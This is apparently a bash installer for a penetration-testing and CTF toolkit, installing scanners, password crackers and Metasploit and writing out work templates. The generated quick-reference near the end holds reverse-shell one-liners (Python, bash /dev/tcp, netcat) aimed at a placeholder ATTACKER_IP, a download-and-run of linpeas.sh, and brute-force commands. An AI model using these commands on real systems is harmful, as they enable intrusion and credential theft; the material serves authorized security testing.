#!/bin/bash

# Pentesting Tools Installation Script
# For authorized security testing and CTF environments
# Run with: sudo bash install-tools.sh

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║     PENTESTING TOOLS INSTALLER                                ║
║     For Authorized Security Testing & CTF Only                ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Please run as root (use sudo)${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Starting installation...${NC}\n"

# Update system
echo -e "${YELLOW}[*] Updating system packages...${NC}"
apt-get update -y
apt-get upgrade -y

# Essential tools
echo -e "${YELLOW}[*] Installing essential tools...${NC}"
apt-get install -y \
    git \
    curl \
    wget \
    python3 \
    python3-pip \
    build-essential \
    net-tools \
    vim \
    tmux \
    htop

# Network scanning and reconnaissance
echo -e "${YELLOW}[*] Installing network scanning tools...${NC}"
apt-get install -y \
    nmap \
    masscan \
    rustscan \
    netcat \
    socat \
    nikto \
    dnsenum \
    dnsrecon \
    fierce \
    sublist3r

# Web application testing
echo -e "${YELLOW}[*] Installing web application testing tools...${NC}"
apt-get install -y \
    burpsuite \
    sqlmap \
    wfuzz \
    dirb \
    gobuster \
    ffuf \
    whatweb

# Install additional web tools via pip
pip3 install \
    dirsearch \
    arjun \
    xsstrike \
    subjack

# Exploitation frameworks
echo -e "${YELLOW}[*] Installing exploitation frameworks...${NC}"
apt-get install -y \
    metasploit-framework \
    exploitdb

# Wireless testing
echo -e "${YELLOW}[*] Installing wireless testing tools...${NC}"
apt-get install -y \
    aircrack-ng \
    reaver \
    wifite

# Password cracking
echo -e "${YELLOW}[*] Installing password cracking tools...${NC}"
apt-get install -y \
    john \
    hashcat \
    hydra \
    medusa \
    crunch

# Reverse engineering and binary analysis
echo -e "${YELLOW}[*] Installing reverse engineering tools...${NC}"
apt-get install -y \
    radare2 \
    binwalk \
    foremost \
    exiftool \
    steghide \
    stegosuite

# Install Ghidra (requires manual download)
echo -e "${YELLOW}[*] Note: Ghidra requires manual installation from https://ghidra-sre.org/${NC}"

# OSINT tools
echo -e "${YELLOW}[*] Installing OSINT tools...${NC}"
apt-get install -y \
    theharvester \
    recon-ng \
    maltego

pip3 install \
    shodan \
    censys

# Forensics
echo -e "${YELLOW}[*] Installing forensics tools...${NC}"
apt-get install -y \
    autopsy \
    sleuthkit \
    volatility

# Additional utilities
echo -e "${YELLOW}[*] Installing additional utilities...${NC}"
apt-get install -y \
    wireshark \
    tshark \
    tcpdump \
    ngrep \
    openvpn

# Python security libraries
echo -e "${YELLOW}[*] Installing Python security libraries...${NC}"
pip3 install \
    requests \
    beautifulsoup4 \
    scrapy \
    pwntools \
    paramiko \
    impacket \
    scapy \
    python-nmap

# Install Go (for modern tools)
echo -e "${YELLOW}[*] Installing Go and Go-based tools...${NC}"
if ! command -v go &> /dev/null; then
    wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
    echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
    echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc
    export PATH=$PATH:/usr/local/go/bin
    rm go1.21.0.linux-amd64.tar.gz
fi

# Install Go-based tools
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/httprobe@latest
go install github.com/ffuf/ffuf@latest

# Install Docker (for containerized tools)
echo -e "${YELLOW}[*] Installing Docker...${NC}"
if ! command -v docker &> /dev/null; then
    curl -fsSL https://get.docker.com -o get-docker.sh
    sh get-docker.sh
    rm get-docker.sh
    systemctl enable docker
    systemctl start docker
fi

# Install useful Docker images
echo -e "${YELLOW}[*] Pulling useful Docker images...${NC}"
docker pull kalilinux/kali-rolling
docker pull owasp/zap2docker-stable
docker pull paloaltonetworks/pan-os-python

# Create tools directory
echo -e "${YELLOW}[*] Setting up tools directory...${NC}"
mkdir -p ~/tools
cd ~/tools

# Clone useful repositories
echo -e "${YELLOW}[*] Cloning useful tool repositories...${NC}"
git clone https://github.com/danielmiessler/SecLists.git
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
git clone https://github.com/carlospolop/PEASS-ng.git
git clone https://github.com/rebootuser/LinEnum.git
git clone https://github.com/SecureAuthCorp/impacket.git

# Wordlists
echo -e "${YELLOW}[*] Installing wordlists...${NC}"
apt-get install -y wordlists
gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true

# Create work tracking directory
echo -e "${YELLOW}[*] Setting up work tracking...${NC}"
mkdir -p ~/pentest-work/{recon,exploitation,post-exploitation,reporting,notes}

# Create template files
cat > ~/pentest-work/template-scope.txt << 'TEMPLATE'
PROJECT: [Project Name]
DATE: [Date]
TESTER: [Your Name]

SCOPE:
- In Scope:
  * [Domain/IP/Application]
  * [Additional assets]

- Out of Scope:
  * [Excluded assets]

RULES OF ENGAGEMENT:
- [Authorization details]
- [Time windows]
- [Restrictions]

OBJECTIVES:
- [Objective 1]
- [Objective 2]
TEMPLATE

cat > ~/pentest-work/template-findings.md << 'TEMPLATE'
# Security Assessment Findings

## Project Information
- **Project:** [Name]
- **Date:** [Date]
- **Tester:** [Name]

## Executive Summary
[High-level overview]

## Findings

### [CRITICAL] - Finding Title
**Description:**
[Describe the vulnerability]

**Impact:**
[What can an attacker do?]

**Affected Systems:**
- [System 1]
- [System 2]

**Proof of Concept:**
```
[Commands or code]
```

**Remediation:**
[How to fix]

**References:**
- [CWE/CVE links]
TEMPLATE

# Configure metasploit database
echo -e "${YELLOW}[*] Configuring Metasploit...${NC}"
systemctl start postgresql
systemctl enable postgresql
msfdb init || true

# Set up aliases
echo -e "${YELLOW}[*] Setting up useful aliases...${NC}"
cat >> ~/.bashrc << 'ALIASES'

# Pentesting aliases
alias ports='netstat -tulanp'
alias myip='curl -s https://api.ipify.org && echo'
alias serve='python3 -m http.server 8000'
alias urlencode='python3 -c "import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))"'
alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))"'
alias b64encode='python3 -c "import sys, base64 as b; print(b.b64encode(sys.argv[1].encode()).decode())"'
alias b64decode='python3 -c "import sys, base64 as b; print(b.b64decode(sys.argv[1]).decode())"'
ALIASES

# Create quick reference guide
cat > ~/pentest-work/quick-reference.md << 'QUICKREF'
# Penetration Testing Quick Reference

## Network Scanning
```bash
# Quick scan
nmap -sV -sC -oA scan_results target

# Full port scan
nmap -p- -oA full_scan target

# UDP scan
nmap -sU -oA udp_scan target
```

## Web Application
```bash
# Directory bruteforce
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
subfinder -d target.com

# Parameter discovery
arjun -u http://target.com/page

# SQL injection
sqlmap -u "http://target.com/page?id=1" --batch
```

## Password Attacks
```bash
# Hydra
hydra -L users.txt -P passwords.txt ssh://target

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

## Exploitation
```bash
# Start Metasploit
msfconsole

# Search for exploits
searchsploit [keyword]
```

## Reverse Shells
```bash
# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Netcat
nc -e /bin/sh ATTACKER_IP PORT
```

## Privilege Escalation
```bash
# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check sudo permissions
sudo -l
```
QUICKREF

echo -e "\n${GREEN}[+] Installation complete!${NC}\n"
echo -e "${BLUE}Tools installed in: ~/tools${NC}"
echo -e "${BLUE}Work directory: ~/pentest-work${NC}"
echo -e "${BLUE}Quick reference: ~/pentest-work/quick-reference.md${NC}\n"

echo -e "${YELLOW}[*] Please run: source ~/.bashrc${NC}"
echo -e "${YELLOW}[*] Reboot may be required for some tools${NC}\n"

echo -e "${RED}[!] REMINDER: Only use these tools for authorized testing!${NC}"
echo -e "${RED}[!] Unauthorized access to computer systems is illegal.${NC}\n"
